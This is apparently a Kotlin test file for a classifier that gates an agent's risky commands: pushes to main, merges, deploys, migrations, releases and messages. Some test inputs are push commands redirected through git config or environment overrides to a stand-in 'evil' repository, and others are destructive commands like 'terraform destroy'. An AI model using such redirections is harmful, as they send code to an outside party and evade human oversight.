// SPDX-License-Identifier: Apache-2.0
package run.ostrom.core.actions

import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonObject
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNull
import kotlin.test.assertTrue

/** The built-in catalogue, ported from `audit-gate.test.ts` (P1, P3) and from the prototype's `ACTIONS` patterns. */
class ActionClassifierTest {

    private val classifier = ActionClassifierImpl()

    private fun classes(command: String): List<String> = classifier.classify(ToolSubject.shell(command)).actions

    @Test
    fun p1PushToMainWithOptionsBeforeTheVerbIsStillPushMain() {
        for (command in listOf(
            "git -C /work/core push origin main",
            "git -C \"/my work/core\" push origin HEAD:main",
            "git -c core.sshCommand=ssh push origin main",
            "git --no-pager push origin main",
            "git --git-dir /work/core/.git push origin main",
        )) {
            assertEquals(listOf("push-main"), classes(command), command)
        }
    }

    @Test
    fun p1DeployWithOptionsBeforeTheVerbIsStillDeploy() {
        for (command in listOf(
            "kubectl -n production apply -f api.yaml",
            "kubectl --context prod rollout restart deploy/api",
            "kubectl -n production patch deploy api -p {}",
            "helm --kube-context prod upgrade api ./chart",
            "terraform -chdir=infra apply -auto-approve",
            "npm --registry https://registry.npmjs.org publish",
            "docker --config /tmp/c push ghcr.io/o/api:1.2.3",
        )) {
            assertEquals(listOf("deploy"), classes(command), command)
        }
    }

    @Test
    fun p1MergeThroughTheApiIsStillMerge() {
        for (command in listOf(
            "gh api -X PUT repos/o/repo-t/pulls/3/merge",
            "curl -X PUT -H \"authorization: token x\" https://api.github.com/repos/o/repo-t/pulls/3/merge",
        )) {
            assertEquals(listOf("merge"), classes(command), command)
        }
    }

    @Test
    fun p1ReadsAndOrdinaryPushesAreNotFrontierActions() {
        for (command in listOf(
            "git -C /work/core pull origin main",
            "git log main",
            "git push origin feature/x",
            "kubectl -n production get pods",
            "helm --kube-context prod list",
        )) {
            assertEquals(emptyList(), classes(command), command)
        }
    }

    @Test
    fun p3PushesThatRedirectGitAreRefusedWithThePlainPushAdvice() {
        for (command in listOf(
            "GIT_DIR=/tmp/other/.git git push origin main",
            "GIT_WORK_TREE=/tmp/other git push origin main",
            "git --git-dir=/tmp/other/.git push origin main",
            "git -c remote.origin.url=https://github.com/evil/x push origin main",
            "git -c remote.origin.pushurl=https://github.com/evil/x push origin main",
            "git -c url.https://github.com/evil/.pushInsteadOf=https://github.com/o/ push origin main",
            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=/tmp/x git push origin main",
        )) {
            val classification = classifier.classify(ToolSubject.shell(command))
            assertEquals(listOf("push-main"), classification.actions, command)
            assertEquals(Refusal.REDIRECTED, classification.refusal, command)
            assertTrue("plain `git push <" in classification.refusal?.message.orEmpty(), command)
        }
        // a redirecting assignment elsewhere in the command counts too: `export` makes it apply to the push
        assertEquals(
            Refusal.REDIRECTED,
            classifier.classify(ToolSubject.shell("export GIT_DIR=/x; git push origin main")).refusal,
        )
        assertEquals(
            Refusal.REDIRECTED,
            classifier.classify(ToolSubject.shell("git --work-tree /x push origin main")).refusal,
        )
        assertEquals(
            Refusal.REDIRECTED,
            classifier.classify(ToolSubject.shell("git --exec-path=/x push origin topic")).refusal,
        )
        assertEquals(
            Refusal.REDIRECTED,
            classifier.classify(ToolSubject.shell("git -c include.path=/x push origin topic")).refusal,
        )
    }

    @Test
    fun harmlessGlobalOptionsDoNotRedirect() {
        for (command in listOf(
            "git -c user.name=x push origin topic",
            "git --super-prefix sub/ push origin topic",
            "git --no-replace-objects push origin topic",
            "git -C .. -C core push origin topic",
        )) {
            val classification = classifier.classify(ToolSubject.shell(command))
            assertEquals(emptyList(), classification.actions, command)
            assertNull(classification.refusal, command)
        }
    }

    @Test
    fun aGitWithoutVerbOrWithAMissingOptionValueIsNotAPush() {
        for (command in listOf("git", "git -C", "git -c", "git --git-dir", "git -C dir", "git --version")) {
            assertEquals(emptyList(), classes(command), command)
        }
    }

    @Test
    fun pushTagForTagsReleasesAndVersionRefs() {
        assertEquals(listOf("push-main", "push-tag"), classes("git push origin --tags"))
        assertEquals(listOf("push-main", "push-tag"), classes("git push --follow-tags origin main"))
        assertEquals(listOf("push-tag"), classes("git push origin v1.2.0"))
        assertEquals(listOf("push-tag"), classes("git push origin refs/tags/release-7"))
        assertEquals(listOf("push-tag"), classes("git push origin 1.2.3:refs/tags/1.2.3"))
        assertEquals(listOf("push-tag"), classes("gh release create v1.0.0 --notes x"))
        assertEquals(emptyList(), classes("gh release list"))
        assertEquals(emptyList(), classes("git push origin v1:x"))
        assertEquals(emptyList(), classes("git push origin release/v2"))
    }

    @Test
    fun mergeForEveryWayToMergeAPullRequest() {
        for (command in listOf(
            "gh pr merge 3 --squash",
            "gh -R o/r pr merge 3",
            "gh pr --repo o/r merge 3",
            "gh api repos/o/r/merges -f base=main -f head=x",
            "gh api graphql -f query='mutation { mergePullRequest(input: {}) { clientMutationId } }'",
            "curl -s https://api.github.com/repos/o/r/merges -d '{}'",
        )) {
            assertEquals(listOf("merge"), classes(command), command)
        }
        assertEquals(emptyList(), classes("gh pr view 3"))
        assertEquals(emptyList(), classes("gh api repos/o/r/pulls/3"))
        assertEquals(emptyList(), classes("gh api repos/o/r/pulls/3/mergeable"))
        assertEquals(emptyList(), classes("gh api repos/o/r/merges_list"))
    }

    @Test
    fun theApiWritesOnMainArePushMain() {
        assertEquals(listOf("push-main"), classes("gh api -X PATCH repos/o/r/git/refs/heads/main -f sha=abc"))
        assertEquals(
            listOf("push-main"),
            classes("curl -X PATCH https://api.github.com/repos/o/r/git/refs/heads/master?x=1"),
        )
        assertEquals(emptyList(), classes("gh api repos/o/r/git/refs/heads/topic"))
        assertEquals(listOf("push-main"), classes("gh api -X PUT repos/o/r/contents/README.md -f message=x"))
        assertEquals(listOf("push-main"), classes("gh api --method=DELETE repos/o/r/contents/a.txt"))
        assertEquals(listOf("push-main"), classes("curl -XPUT https://api.github.com/repos/o/r/contents/a"))
        assertEquals(listOf("push-main"), classes("curl --request=PUT https://api.github.com/repos/o/r/contents/a"))
        assertEquals(listOf("push-main"), classes("curl --request put https://api.github.com/repos/o/r/contents/a"))
        assertEquals(emptyList(), classes("gh api repos/o/r/contents/README.md"))
        assertEquals(emptyList(), classes("curl -X GET https://api.github.com/repos/o/r/contents/a"))
        assertEquals(emptyList(), classes("curl https://api.github.com/repos/o/r/contents/a -X"))
    }

    @Test
    fun deployCoversEveryToolOfTheCatalogue() {
        for (command in listOf(
            "helm install api ./chart", "helm rollback api 3", "helm uninstall api",
            "kubectl delete pod x", "kubectl scale deploy api --replicas 0", "kubectl replace -f a.yaml",
            "kubectl edit deploy api", "kubectl -n prod set image deploy/api api=x:2",
            "kubectl --insecure apply -f a.yaml",
            "terraform destroy", "fly deploy", "flyctl -a api deploy", "vercel --prod", "vercel deploy --prod=true",
            "pnpm publish", "yarn npm publish", "yarn publish", "podman push x", "docker image push x",
            "deploy production", "./deploy.sh prod", "gh workflow run deploy-prod.yml",
            "sudo -u ops kubectl apply -f a.yaml", "xargs kubectl delete pod", "timeout 30s helm upgrade api ./c",
            "env FOO=1 kubectl apply -f a", "nohup flyctl deploy &",
            // a changed environment rolls the pods out again
            "kubectl set env deploy/api X=1", "kubectl create deploy api --image x", "kubectl run x --image y",
            "tofu apply", "pulumi up", "helmfile sync", "argocd app sync api", "kamal deploy", "firebase deploy",
            "wrangler publish", "sls deploy", "netlify deploy --prod", "gcloud run deploy api", "cap production deploy",
            "docker buildx build --push -t x .", "docker compose push", "serverless deploy",
        )) {
            assertEquals(listOf("deploy"), classes(command), command)
        }
        for (command in listOf(
            "helm list", "kubectl get pods", "terraform plan", "fly status",
            "vercel", "npm install", "yarn npm info", "docker build .", "docker image ls", "deploy staging", "deploy",
            "gh workflow run tests.yml", "gh workflow list", "tofu plan", "pulumi preview", "helmfile diff",
            "argocd app get api", "argocd app", "firebase login", "netlify deploy", "gcloud auth login",
            "docker buildx build .", "docker compose up", "argocd version", "netlify status",
        )) {
            assertEquals(emptyList(), classes(command), command)
        }
    }

    @Test
    fun migrationCoversTheToolsAndTheMigrationFolder() {
        for (command in listOf(
            "flyway -url=x migrate", "flyway migrate", "npx prisma migrate deploy", "alembic upgrade head",
            "liquibase --changelog-file=x update", "rails db:migrate", "bundle exec rake db:migrate:redo",
            "knex migrate:latest",
            "cat > src/main/resources/db/migration/V3__x.sql <<EOF\nCREATE TABLE t (id int);\nEOF",
        )) {
            assertEquals(listOf("migration"), classes(command), command)
        }
        for (command in listOf(
            "flyway info", "prisma migrate dev", "prisma generate", "alembic history", "liquibase status",
            "rails server", "knex seed:run", "liquibase updates-sql")) {
            assertEquals(emptyList(), classes(command), command)
        }
        val write = ToolSubject.of(
            "Write",
            buildJsonObject { put("file_path", JsonPrimitive("/r/src/db/migration/V3__x.sql")) },
        )
        assertEquals(listOf("migration"), classifier.classify(write).actions)
        val other = ToolSubject.of("Edit", buildJsonObject { put("file_path", JsonPrimitive("/r/src/App.kt")) })
        assertEquals(emptyList(), classifier.classify(other).actions)
    }

    @Test
    fun mobileReleaseCoversFastlaneAndProductionBuilds() {
        assertEquals(listOf("mobile-release"), classes("bundle exec fastlane ios release"))
        assertEquals(listOf("mobile-release"), classes("eas build --profile production --platform ios"))
        assertEquals(listOf("mobile-release"), classes("npx eas submit -p android --profile=production"))
        assertEquals(emptyList(), classes("eas build --profile preview"))
        assertEquals(emptyList(), classes("eas update --branch production"))
    }

    @Test
    fun clientMessageCoversTheMessagingMcpTools() {
        for (tool in listOf(
            "mcp__cr-support__send_validated_message", "mcp__discord__discord_send",
            "mcp__discord__discord_reply_to_forum",
            "mcp__slack__chat_postMessage", "mcp__mail__send_email", "mcp__slack__slack_post_message",
        )) {
            assertEquals(
                listOf("client-message"),
                classifier.classify(ToolSubject.of(tool, buildJsonObject { })).actions,
                tool,
            )
        }
        assertEquals(
            emptyList(),
            classifier.classify(ToolSubject.of("mcp__discord__discord_read_messages", buildJsonObject { })).actions,
        )
    }

    @Test
    fun aToolInAMessageIsNotAnActionUnlessItStandsWhereACommandStands() {
        // a quoted word is read as a script only from its command position: a commit message is not a deploy
        assertEquals(emptyList(), classes("git commit -m 'fix kubectl apply in the docs'"))
        assertEquals(emptyList(), classes("git commit -m 'bump fastlane to 2.0'"))
        // but text that reads as a command is taken as one: the classifier cannot know what `echo` or `grep` do with it
        assertEquals(listOf("deploy"), classes("echo \"helm upgrade api ./chart\""))
        assertEquals(listOf("mobile-release"), classes("git commit -m 'bump; fastlane is next'"))
        val quoted = classifier.classify(ToolSubject.shell("grep -r 'git push origin main' docs"))
        assertEquals(listOf("push-main"), quoted.actions)
        assertEquals(Refusal.NOT_PLAIN, quoted.refusal)
        // and a tool is looked for at every word of a command the shell runs (`xargs kubectl`, `sudo helm`)
        assertEquals(listOf("deploy"), classes("echo deploy production"))
    }

    @Test
    fun aToolRunByAnotherShellOrASubstitutionIsAnAction() {
        assertEquals(listOf("deploy"), classes("bash -c 'kubectl apply -f a.yaml'"))
        assertEquals(listOf("deploy"), classes("ssh host 'cd /srv && helm upgrade api ./chart'"))
        assertEquals(listOf("deploy"), classes("echo \$(kubectl apply -f a.yaml)"))
        assertEquals(listOf("deploy"), classes("bash <<EOF\nkubectl apply -f a.yaml\nEOF"))
        assertEquals(listOf("mobile-release"), classes("sh -c \"sudo fastlane beta\""))
        assertEquals(listOf("push-main"), classes("bash -c 'git push origin main'"))
    }

    @Test
    fun otherToolsAndEmptyCommandsAreNeverActions() {
        assertEquals(Classification(emptyList()), classifier.classify(ToolSubject.of("Read", buildJsonObject { })))
        assertEquals(Classification(emptyList()), classifier.classify(ToolSubject.shell("")))
        assertEquals(Classification(emptyList()), classifier.classify(ToolSubject.shell("ls -la")))
    }

    @Test
    fun theCatalogueIsTheBuiltInOneInThePrototypeOrder() {
        assertEquals(
            listOf("push-main", "push-tag", "merge", "deploy", "migration", "mobile-release", "client-message"),
            classifier.catalogue.map { it.id },
        )
        assertEquals(BuiltInActions.all, classifier.catalogue)
        assertEquals(emptyList(), classifier.rejectedPatterns)
        assertEquals(setOf(SubjectKind.SHELL, SubjectKind.WRITE), classifier.catalogue[4].kinds)
    }

    @Test
    fun severalActionsComeInCatalogueOrder() {
        assertEquals(
            listOf("push-main", "merge", "deploy"),
            classes("helm upgrade api ./c && gh pr merge 3 && git push origin main"),
        )
    }

    @Test
    fun protectedBranchesAreConfigurable() {
        val develop = ActionClassifierImpl(protectedBranches = setOf("develop"))
        assertEquals(listOf("push-main"), develop.classify(ToolSubject.shell("git push origin DEVELOP")).actions)
        assertEquals(emptyList(), develop.classify(ToolSubject.shell("git push origin main")).actions)
        assertEquals(
            listOf("push-main"),
            develop.classify(ToolSubject.shell("gh api -X PATCH repos/o/r/git/refs/heads/develop")).actions,
        )
    }
}
